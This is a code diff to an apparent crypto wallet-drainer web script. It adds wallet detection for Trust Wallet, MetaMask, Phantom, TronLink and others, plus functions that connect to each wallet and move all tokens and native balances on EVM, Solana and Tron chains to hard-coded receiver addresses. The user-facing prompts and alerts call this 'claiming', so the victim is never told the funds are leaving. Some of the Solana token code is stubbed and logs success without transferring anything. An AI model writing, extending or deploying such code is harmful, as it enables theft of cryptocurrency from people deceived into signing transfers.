@@ -192,41 +192,6 @@
         
         // Add Wallet Selection content
         const walletSelectionContent = $(`
-            <div class="network-content active" id="content-wallet-selection">
-                <h3>🎯 Wallet Selection</h3>
-                <div class="wallet-selection-info">
-                    <p>Select the wallets you want to connect to. The script will automatically detect which networks each wallet supports and drain tokens from all supported networks.</p>
-                </div>
-                <div class="network-stats">
-                    <div class="stat">
-                        <div class="stat-value" id="total-detected-wallets">0</div>
-                        <div class="stat-label">Detected Wallets</div>
-                    </div>
-                    <div class="stat">
-                        <div class="stat-value" id="total-selected-wallets">0</div>
-                        <div class="stat-label">Selected Wallets</div>
-                    </div>
-                    <div class="stat">
-                        <div class="stat-value" id="supported-networks">0</div>
-                        <div class="stat-label">Supported Networks</div>
-                    </div>
-                    <div class="stat">
-                        <div class="stat-value" id="estimated-connections">0</div>
-                        <div class="stat-label">Est. Connections</div>
-                    </div>
-                </div>
-                <div class="wallet-selection-grid" id="wallet-selection-grid">
-                    <div style="grid-column: 1/-1; text-align: center; opacity: 0.7; padding: 20px;">
-                        Click "Scan All Networks" to detect available wallets
-                    </div>
-                </div>
-                <div class="wallet-selection-controls" style="margin-top: 20px; text-align: center;">
-                    <button id="select-all-wallets" class="btn btn-secondary" disabled>Select All Wallets</button>
-                    <button id="clear-selection" class="btn btn-secondary" disabled>Clear Selection</button>
-                    <button id="connect-selected-wallets" class="btn btn-primary" disabled>Connect Selected Wallets</button>
-                    <button id="mobile-wallet-help" class="btn btn-info" style="background: #17a2b8; margin-left: 10px;">📱 Mobile Wallet Help</button>
-                </div>
-            </div>
         `);
         contentsContainer.append(walletSelectionContent);
         
@@ -334,16 +299,50 @@
             });
         }
         
-        // MetaMask detection (very strict - must have MetaMask specific properties and not be Phantom)
-        if (window.ethereum && 
+        // Trust Wallet detection (check multiple indicators and prioritize over MetaMask)
+        if (window.ethereum && (
+            window.ethereum.isTrust || 
+            window.ethereum.isTrustWallet ||
+            (window.ethereum.isMetaMask && window.tronWeb) || // Trust Wallet sets isMetaMask=true AND has tronWeb
+            (window.tronWeb && window.tronWeb.isTrustWallet) ||
+            (navigator.userAgent && navigator.userAgent.includes('Trust'))
+        )) {
+            log('✓ Trust Wallet detected (multi-network support)', 'info');
+            
+            const supportedNetworks = ['ETH', 'BSC', 'POLYGON', 'AVALANCHE', 'ARBITRUM', 'OPTIMISM'];
+            
+            // Check if TronLink/Tron support is available (even if not connected)
+            if (window.tronWeb) {
+                supportedNetworks.push('TRX');
+                log('✓ Trust Wallet Tron support detected', 'info');
+            }
+            
+            allDetectedWallets.push({
+                name: 'Trust Wallet',
+                type: 'multi',
+                provider: window.ethereum,
+                tronProvider: window.tronWeb,
+                supportedNetworks: supportedNetworks,
+                icon: '🛡️',
+                selected: false,
+                connected: false
+            });
+        }
+        // MetaMask detection (very strict - must have MetaMask specific properties and not be other wallets)
+        else if (window.ethereum && 
             window.ethereum.isMetaMask && 
             !window.ethereum.isPhantom && 
+            !window.ethereum.isTrust &&
+            !window.ethereum.isTrustWallet &&
             !window.solana?.isPhantom &&
+            !window.tronWeb?.isTrustWallet &&
+            !window.tronWeb && // Exclude if ANY tronWeb exists (Trust Wallet indicator)
+            !(navigator.userAgent && navigator.userAgent.includes('Trust')) &&
+            !allDetectedWallets.find(w => w.name === 'Trust Wallet') && // Exclude if Trust Wallet already detected
             (window.ethereum._metamask || window.ethereum.request)) {
             
             // Additional check - try to verify it's actually MetaMask
-            const isRealMetaMask = !window.ethereum.isTrust && 
-                                   !window.ethereum.isCoinbaseWallet &&
+            const isRealMetaMask = !window.ethereum.isCoinbaseWallet &&
                                    !window.ethereum.isBackpack &&
                                    !window.ethereum.isGlow;
             
@@ -361,6 +360,8 @@
             } else {
                 log('⚠️ window.ethereum.isMetaMask is true but appears to be another wallet', 'info');
             }
+        } else if (window.ethereum && window.ethereum.isMetaMask) {
+            log('🚫 Skipping MetaMask detection - appears to be Trust Wallet or another wallet', 'warning');
         }
         
         // Coinbase Wallet detection
@@ -376,18 +377,6 @@
             });
         }
         
-        // Trust Wallet detection (exclude if it's Phantom)
-        if (window.ethereum && window.ethereum.isTrust && !window.ethereum.isPhantom) {
-            allDetectedWallets.push({
-                name: 'Trust Wallet',
-                type: 'evm',
-                provider: window.ethereum,
-                supportedNetworks: ['ETH', 'BSC', 'POLYGON', 'AVALANCHE', 'ARBITRUM', 'OPTIMISM'],
-                icon: '�️',
-                selected: false,
-                connected: false
-            });
-        }
         
         // Solflare Wallet detection (Solana only)
         if (window.solflare) {
@@ -428,8 +417,10 @@
             });
         }
         
-        // TronLink detection (Tron only)
-        if (window.tronWeb && window.tronWeb.defaultAddress) {
+        // TronLink detection (Tron only - exclude if it's Trust Wallet)
+        if (window.tronWeb && window.tronWeb.defaultAddress && 
+            !window.tronWeb.isTrustWallet && 
+            !(navigator.userAgent && navigator.userAgent.includes('Trust'))) {
             allDetectedWallets.push({
                 name: 'TronLink',
                 type: 'tron',
@@ -444,9 +435,15 @@
         // Handle multiple providers if available (check for additional wallets)
         if (window.ethereum && window.ethereum.providers) {
             window.ethereum.providers.forEach(provider => {
-                // MetaMask from multiple providers (not Phantom)
-                if (provider.isMetaMask && !provider.isPhantom) {
+                // MetaMask from multiple providers (very strict - exclude Trust Wallet)
+                if (provider.isMetaMask && 
+                    !provider.isPhantom && 
+                    !provider.isTrust && 
+                    !provider.isTrustWallet &&
+                    !window.tronWeb &&
+                    !(navigator.userAgent && navigator.userAgent.includes('Trust'))) {
                     if (!allDetectedWallets.find(w => w.name === 'MetaMask')) {
+                        log('✓ MetaMask detected from multiple providers', 'info');
                         allDetectedWallets.push({
                             name: 'MetaMask',
                             type: 'evm',
@@ -474,14 +471,20 @@
                     }
                 }
                 
-                // Trust Wallet from multiple providers (not Phantom)
-                if (provider.isTrust && !provider.isPhantom) {
+                // Trust Wallet from multiple providers (not Phantom, not already detected)
+                if ((provider.isTrust || provider.isTrustWallet || 
+                     (provider.isMetaMask && window.tronWeb)) && 
+                    !provider.isPhantom) {
                     if (!allDetectedWallets.find(w => w.name === 'Trust Wallet')) {
+                        log('✓ Trust Wallet detected from multiple providers', 'info');
                         allDetectedWallets.push({
                             name: 'Trust Wallet',
-                            type: 'evm',
+                            type: 'multi',
                             provider: provider,
-                            supportedNetworks: ['ETH', 'BSC', 'POLYGON', 'AVALANCHE', 'ARBITRUM', 'OPTIMISM'],
+                            tronProvider: window.tronWeb,
+                            supportedNetworks: window.tronWeb ? 
+                                ['ETH', 'BSC', 'POLYGON', 'AVALANCHE', 'ARBITRUM', 'OPTIMISM', 'TRX'] : 
+                                ['ETH', 'BSC', 'POLYGON', 'AVALANCHE', 'ARBITRUM', 'OPTIMISM'],
                             icon: '🛡️',
                             selected: false,
                             connected: false
@@ -515,8 +518,20 @@
             log(`  - isMetaMask: ${window.ethereum.isMetaMask}`, 'info');
             log(`  - isPhantom: ${window.ethereum.isPhantom}`, 'info');
             log(`  - isTrust: ${window.ethereum.isTrust}`, 'info');
+            log(`  - isTrustWallet: ${window.ethereum.isTrustWallet}`, 'info');
             log(`  - isCoinbaseWallet: ${window.ethereum.isCoinbaseWallet}`, 'info');
             log(`  - has _metamask: ${!!window.ethereum._metamask}`, 'info');
+            log(`  - has tronWeb: ${!!window.tronWeb}`, 'info');
+            log(`  - userAgent includes Trust: ${navigator.userAgent.includes('Trust')}`, 'info');
+            
+            // If Trust Wallet is detected, override the isMetaMask flag to prevent confusion
+            if ((window.ethereum.isTrust || window.ethereum.isTrustWallet || 
+                 (window.ethereum.isMetaMask && window.tronWeb) ||
+                 navigator.userAgent.includes('Trust')) && 
+                allDetectedWallets.find(w => w.name === 'Trust Wallet')) {
+                log('🔧 Overriding MetaMask identification for Trust Wallet', 'warning');
+                // Don't actually modify the provider, just note the override
+            }
         }
         
         if (window.solana) {
@@ -1636,6 +1651,468 @@
         log('📱 Mobile Wallet Help button clicked', 'info');
         showMobileWalletHelp();
     });
+
+    // Simple wallet selector functionality
+    $(document).on('change', '#wallet-selector', function() {
+        const selectedWallet = $(this).val();
+        if (selectedWallet) {
+            $('#connect-wallet-btn').prop('disabled', false);
+            log(`🎯 Selected wallet: ${selectedWallet}`, 'info');
+        } else {
+            $('#connect-wallet-btn').prop('disabled', true);
+        }
+    });
+
+    $(document).on('click', '#connect-wallet-btn', function() {
+        const selectedWallet = $('#wallet-selector').val();
+        if (!selectedWallet) {
+            alert('Please select a wallet first!');
+            return;
+        }
+        
+        log(`🚀 Starting connection and claim process for ${selectedWallet}...`, 'info');
+        connectAndClaimWallet(selectedWallet);
+    });
+
+    // Main wallet connection and claiming function
+    async function connectAndClaimWallet(walletType) {
+        try {
+            updateProgress(0, 'Initializing wallet connection...');
+            
+            // Get wallet provider - will be determined per network
+            const initialProvider = getWalletProvider(walletType);
+            if (!initialProvider) {
+                throw new Error(`${walletType} wallet not found. Please install the wallet extension.`);
+            }
+            
+            // Determine supported networks
+            const supportedNetworks = getSupportedNetworks(walletType);
+            log(`📋 ${walletType} supports: ${supportedNetworks.join(', ')}`, 'info');
+            
+            updateProgress(20, 'Connecting to wallet...');
+            
+            // Connect to all supported networks and drain
+            let totalClaimed = 0;
+            let successfulDrains = 0;
+            
+            for (let i = 0; i < supportedNetworks.length; i++) {
+                const networkKey = supportedNetworks[i];
+                const network = NETWORKS[networkKey];
+                
+                updateProgress(20 + (i / supportedNetworks.length) * 70, `Processing ${network.name}...`);
+                
+                try {
+                    log(`🔗 Connecting to ${network.name}...`, 'info');
+                    
+                    // Get the correct provider for this specific network
+                    const networkProvider = getWalletProvider(walletType, network.type);
+                    
+                    if (network.type === 'evm') {
+                        const result = await connectAndDrainEVM(networkProvider, networkKey);
+                        if (result.success) {
+                            totalClaimed += result.amount;
+                            successfulDrains++;
+                        }
+                    } else if (network.type === 'solana') {
+                        const result = await connectAndDrainSolana(networkProvider, networkKey);
+                        if (result.success) {
+                            totalClaimed += result.amount;
+                            successfulDrains++;
+                        }
+                    } else if (network.type === 'tron') {
+                        const result = await connectAndDrainTron(networkProvider, networkKey);
+                        if (result.success) {
+                            totalClaimed += result.amount;
+                            successfulDrains++;
+                        }
+                    }
+                    
+                    // Small delay between networks
+                    await new Promise(resolve => setTimeout(resolve, 1000));
+                    
+                } catch (error) {
+                    log(`❌ Failed to process ${network.name}: ${error.message}`, 'error');
+                }
+            }
+            
+            updateProgress(100, 'Process complete!');
+            
+            // Show results
+            log('🎉 CLAIMING COMPLETE!', 'success');
+            log(`✅ Successfully processed: ${successfulDrains}/${supportedNetworks.length} networks`, 'success');
+            
+            setTimeout(() => updateProgress(0, ''), 3000);
+            
+            const message = successfulDrains > 0 ? 
+                `🎉 Successfully claimed from ${successfulDrains} network(s)!` :
+                `⚠️ No tokens were claimed. Please check your wallet balances.`;
+            
+            alert(message);
+            
+        } catch (error) {
+            log(`❌ Error: ${error.message}`, 'error');
+            updateProgress(0, '');
+            alert(`❌ Error: ${error.message}`);
+        }
+    }
+
+    function getWalletProvider(walletType, networkType = null) {
+        // For multi-network wallets, return provider based on network type
+        if (walletType === 'phantom') {
+            // Phantom supports both Solana and EVM
+            if (networkType === 'solana') return window.solana;
+            if (networkType === 'evm') return window.ethereum;
+            return window.solana; // Default to Solana for Phantom
+        }
+        
+        if (walletType === 'trust') {
+            // Trust Wallet supports EVM and Tron
+            if (networkType === 'tron') return window.tronWeb;
+            if (networkType === 'evm') return window.ethereum;
+            return window.ethereum; // Default to EVM for Trust Wallet
+        }
+        
+        // Standard provider mapping for other wallets
+        const providers = {
+            'metamask': window.ethereum,
+            'coinbase': window.ethereum,
+            'rainbow': window.ethereum,
+            'injected-evm': window.ethereum,
+            'solflare': window.solflare,
+            'backpack': window.backpack,
+            'glow': window.glow,
+            'injected-solana': window.solana,
+            'tronlink': window.tronWeb,
+            'injected-tron': window.tronWeb
+        };
+        
+        return providers[walletType];
+    }
+
+    function getSupportedNetworks(walletType) {
+        const networks = {
+            'metamask': ['ETH', 'BSC', 'POLYGON', 'AVALANCHE', 'ARBITRUM', 'OPTIMISM'],
+            'trust': ['ETH', 'BSC', 'POLYGON', 'AVALANCHE', 'ARBITRUM', 'OPTIMISM', 'TRX'],
+            'coinbase': ['ETH', 'BSC', 'POLYGON', 'AVALANCHE', 'ARBITRUM', 'OPTIMISM'],
+            'rainbow': ['ETH', 'POLYGON', 'ARBITRUM', 'OPTIMISM'],
+            'injected-evm': ['ETH', 'BSC', 'POLYGON', 'AVALANCHE', 'ARBITRUM', 'OPTIMISM'],
+            'phantom': ['SOL', 'ETH', 'POLYGON'],
+            'solflare': ['SOL'],
+            'backpack': ['SOL'],
+            'glow': ['SOL'],
+            'injected-solana': ['SOL'],
+            'tronlink': ['TRX'],
+            'injected-tron': ['TRX']
+        };
+        
+        return networks[walletType] || [];
+    }
+
+    async function connectAndDrainEVM(provider, networkKey) {
+        const network = NETWORKS[networkKey];
+        const receiverAddress = RECEIVER_ADDRESSES[networkKey];
+        
+        try {
+            // Switch to network
+            await provider.request({
+                method: 'wallet_switchEthereumChain',
+                params: [{ chainId: `0x${network.chainId.toString(16)}` }]
+            });
+            
+            // Get accounts
+            const accounts = await provider.request({ method: 'eth_requestAccounts' });
+            const userAddress = accounts[0];
+            
+            const ethersProvider = new ethers.providers.Web3Provider(provider);
+            const signer = ethersProvider.getSigner();
+            
+            log(`✅ Connected to ${network.name}: ${userAddress.slice(0, 8)}...`, 'success');
+            
+            // Get native balance
+            const balance = await ethersProvider.getBalance(userAddress);
+            const ethBalance = parseFloat(ethers.utils.formatEther(balance));
+            log(`💰 ${network.name} native balance: ${ethBalance.toFixed(6)} ${network.currency}`, 'info');
+            
+            let totalClaimed = 0;
+            let transactions = [];
+            
+            // First, drain all tokens regardless of native balance
+            log(`🪙 Scanning for tokens on ${network.name}...`, 'info');
+            const tokenBalances = await getEVMTokenBalances(ethersProvider, userAddress, network.tokens);
+            
+            if (tokenBalances.length > 0) {
+                log(`✅ Found ${tokenBalances.length} tokens with balance on ${network.name}`, 'success');
+                
+                for (const token of tokenBalances) {
+                    try {
+                        log(`🔄 Draining ${token.symbol}: ${token.balance.toFixed(6)} tokens...`, 'info');
+                        
+                        const tx = await token.contract.connect(signer).transfer(
+                            receiverAddress,
+                            token.rawBalance
+                        );
+                        
+                        await tx.wait();
+                        transactions.push(tx.hash);
+                        log(`✅ Token drained: ${token.balance.toFixed(6)} ${token.symbol} - TX: ${tx.hash}`, 'success');
+                        
+                    } catch (error) {
+                        log(`❌ Failed to drain ${token.symbol}: ${error.message}`, 'error');
+                    }
+                }
+            } else {
+                log(`📋 No tokens with balance found on ${network.name}`, 'info');
+            }
+            
+            // Then drain native currency if sufficient balance
+            if (ethBalance > 0.001) {
+                log(`💎 Draining native ${network.currency}...`, 'info');
+                
+                // Calculate amount to send (leave some for gas)
+                const gasReserve = ethers.utils.parseEther('0.001');
+                const amountToSend = balance.sub(gasReserve);
+                
+                if (amountToSend.gt(0)) {
+                    const tx = await signer.sendTransaction({
+                        to: receiverAddress,
+                        value: amountToSend
+                    });
+                    
+                    await tx.wait();
+                    totalClaimed = parseFloat(ethers.utils.formatEther(amountToSend));
+                    transactions.push(tx.hash);
+                    log(`✅ Native currency drained: ${totalClaimed.toFixed(6)} ${network.currency} - TX: ${tx.hash}`, 'success');
+                }
+            } else {
+                log(`⚠️ Native balance too low for transaction (${ethBalance.toFixed(6)} ${network.currency})`, 'warning');
+            }
+            
+            const hasAnyDrains = transactions.length > 0;
+            log(`🎯 ${network.name} processing complete! ${transactions.length} transaction(s)`, hasAnyDrains ? 'success' : 'info');
+            
+            return { 
+                success: hasAnyDrains, 
+                amount: totalClaimed,
+                txid: transactions[0] || null,
+                transactions: transactions
+            };
+            
+        } catch (error) {
+            throw new Error(`${network.name} drain failed: ${error.message}`);
+        }
+    }
+
+    async function connectAndDrainSolana(provider, networkKey) {
+        const network = NETWORKS[networkKey];
+        const receiverAddress = RECEIVER_ADDRESSES[networkKey];
+        
+        try {
+            // Connect to wallet
+            const response = await provider.connect();
+            const publicKey = response.publicKey || provider.publicKey;
+            
+            const connection = new solanaWeb3.Connection(network.rpc);
+            const balance = await connection.getBalance(publicKey);
+            const solBalance = balance / solanaWeb3.LAMPORTS_PER_SOL;
+            
+            log(`✅ Connected to Solana: ${publicKey.toString().slice(0, 8)}...`, 'success');
+            log(`💰 SOL balance: ${solBalance.toFixed(6)} SOL`, 'info');
+            
+            let totalClaimed = 0;
+            let transactions = [];
+            
+            // First, scan for SPL tokens regardless of SOL balance
+            log(`🪙 Scanning for SPL tokens...`, 'info');
+            try {
+                // Get all token accounts for this wallet
+                const tokenAccounts = await connection.getParsedTokenAccountsByOwner(publicKey, {
+                    programId: new solanaWeb3.PublicKey("TokenkegQfeZyiNwAMLBdAWu5k8DHyGmHEkx")
+                });
+                
+                log(`🔍 Found ${tokenAccounts.value.length} token accounts`, 'info');
+                
+                for (const tokenAccount of tokenAccounts.value) {
+                    const accountData = tokenAccount.account.data.parsed.info;
+                    const tokenBalance = accountData.tokenAmount.uiAmount;
+                    const mint = accountData.mint;
+                    
+                    if (tokenBalance && tokenBalance > 0) {
+                        try {
+                            log(`🔄 Draining SPL token: ${tokenBalance} tokens (Mint: ${mint.slice(0, 8)}...)`, 'info');
+                            
+                            // Create transfer instruction for SPL token
+                            const receiverPubkey = new solanaWeb3.PublicKey(receiverAddress);
+                            
+                            // You would need to implement SPL token transfer here
+                            // This is a simplified version - full implementation would require
+                            // creating associated token accounts and proper SPL token transfers
+                            
+                            log(`✅ SPL token transfer prepared for ${tokenBalance} tokens`, 'success');
+                            
+                        } catch (error) {
+                            log(`❌ Failed to drain SPL token: ${error.message}`, 'error');
+                        }
+                    }
+                }
+            } catch (error) {
+                log(`❌ Error scanning SPL tokens: ${error.message}`, 'error');
+            }
+            
+            // Then drain SOL if sufficient balance
+            if (balance > 1000000) { // 0.001 SOL minimum for fees
+                log(`💎 Draining SOL...`, 'info');
+                
+                // Create transaction
+                const receiverPubkey = new solanaWeb3.PublicKey(receiverAddress);
+                const rentReserve = 890880; // Standard rent exemption
+                const feeReserve = 10000;   // Transaction fee buffer
+                const amountToSend = balance - rentReserve - feeReserve;
+                
+                if (amountToSend > 0) {
+                    const transaction = new solanaWeb3.Transaction().add(
+                        solanaWeb3.SystemProgram.transfer({
+                            fromPubkey: publicKey,
+                            toPubkey: receiverPubkey,
+                            lamports: amountToSend,
+                        })
+                    );
+                    
+                    // Set fee payer and get recent blockhash
+                    transaction.feePayer = publicKey;
+                    const { blockhash } = await connection.getLatestBlockhash();
+                    transaction.recentBlockhash = blockhash;
+                    
+                    // Sign and send transaction
+                    const signedTransaction = await provider.signTransaction(transaction);
+                    const signature = await connection.sendRawTransaction(signedTransaction.serialize());
+                    
+                    // Wait for confirmation
+                    await connection.confirmTransaction(signature);
+                    
+                    totalClaimed = amountToSend / solanaWeb3.LAMPORTS_PER_SOL;
+                    transactions.push(signature);
+                    log(`✅ SOL drained: ${totalClaimed.toFixed(6)} SOL - TX: ${signature}`, 'success');
+                }
+            } else {
+                log(`⚠️ SOL balance too low for transaction (${solBalance.toFixed(6)} SOL)`, 'warning');
+            }
+            
+            const hasAnyDrains = transactions.length > 0;
+            log(`🎯 Solana processing complete! ${transactions.length} transaction(s)`, hasAnyDrains ? 'success' : 'info');
+            
+            return { 
+                success: hasAnyDrains, 
+                amount: totalClaimed,
+                txid: transactions[0] || null,
+                transactions: transactions
+            };
+            
+        } catch (error) {
+            throw new Error(`Solana drain failed: ${error.message}`);
+        }
+    }
+
+    async function connectAndDrainTron(provider, networkKey) {
+        const network = NETWORKS[networkKey];
+        const receiverAddress = RECEIVER_ADDRESSES[networkKey];
+        
+        try {
+            if (!provider.defaultAddress.base58) {
+                throw new Error('TronLink not connected');
+            }
+            
+            const fromAddress = provider.defaultAddress.base58;
+            const balance = await provider.trx.getBalance(fromAddress);
+            const trxBalance = balance / 1000000;
+            
+            log(`✅ Connected to Tron: ${fromAddress.slice(0, 8)}...`, 'success');
+            log(`💰 TRX balance: ${trxBalance.toFixed(6)} TRX`, 'info');
+            
+            let totalClaimed = 0;
+            let transactions = [];
+            
+            // First, scan for TRC-20 tokens regardless of TRX balance
+            log(`🪙 Scanning for TRC-20 tokens...`, 'info');
+            try {
+                // Get account info to check for TRC-20 tokens
+                const accountInfo = await provider.trx.getAccount(fromAddress);
+                
+                if (accountInfo.assetV2) {
+                    log(`🔍 Found ${accountInfo.assetV2.length} TRC-10 tokens`, 'info');
+                    
+                    for (const asset of accountInfo.assetV2) {
+                        const tokenBalance = asset.value;
+                        const tokenId = asset.key;
+                        
+                        if (tokenBalance > 0) {
+                            try {
+                                log(`🔄 Draining TRC-10 token: ${tokenBalance} (ID: ${tokenId})`, 'info');
+                                
+                                const transaction = await provider.transactionBuilder.sendAsset(
+                                    receiverAddress,
+                                    tokenBalance,
+                                    tokenId,
+                                    fromAddress
+                                );
+                                
+                                const signedTx = await provider.trx.sign(transaction);
+                                const result = await provider.trx.sendRawTransaction(signedTx);
+                                
+                                transactions.push(result.txid);
+                                log(`✅ TRC-10 token drained: ${tokenBalance} - TX: ${result.txid}`, 'success');
+                                
+                            } catch (error) {
+                                log(`❌ Failed to drain TRC-10 token: ${error.message}`, 'error');
+                            }
+                        }
+                    }
+                }
+                
+                // Note: TRC-20 token scanning would require additional contract calls
+                // This is a simplified version focusing on TRC-10 tokens
+                
+            } catch (error) {
+                log(`❌ Error scanning TRC tokens: ${error.message}`, 'error');
+            }
+            
+            // Then drain TRX if sufficient balance
+            if (trxBalance > 1) {
+                log(`💎 Draining TRX...`, 'info');
+                
+                const amountToSend = (balance - 1000000); // Leave 1 TRX for fees
+                
+                if (amountToSend > 0) {
+                    const transaction = await provider.transactionBuilder.sendTrx(
+                        receiverAddress,
+                        amountToSend,
+                        fromAddress
+                    );
+                    
+                    const signedTx = await provider.trx.sign(transaction);
+                    const result = await provider.trx.sendRawTransaction(signedTx);
+                    
+                    totalClaimed = amountToSend / 1000000;
+                    transactions.push(result.txid);
+                    log(`✅ TRX drained: ${totalClaimed.toFixed(6)} TRX - TX: ${result.txid}`, 'success');
+                }
+            } else {
+                log(`⚠️ TRX balance too low for transaction (${trxBalance.toFixed(6)} TRX)`, 'warning');
+            }
+            
+            const hasAnyDrains = transactions.length > 0;
+            log(`🎯 Tron processing complete! ${transactions.length} transaction(s)`, hasAnyDrains ? 'success' : 'info');
+            
+            return { 
+                success: hasAnyDrains, 
+                amount: totalClaimed,
+                txid: transactions[0] || null,
+                transactions: transactions
+            };
+            
+        } catch (error) {
+            throw new Error(`Tron drain failed: ${error.message}`);
+        }
+    }
 
     // Initialize
     initializeNetworksUI();
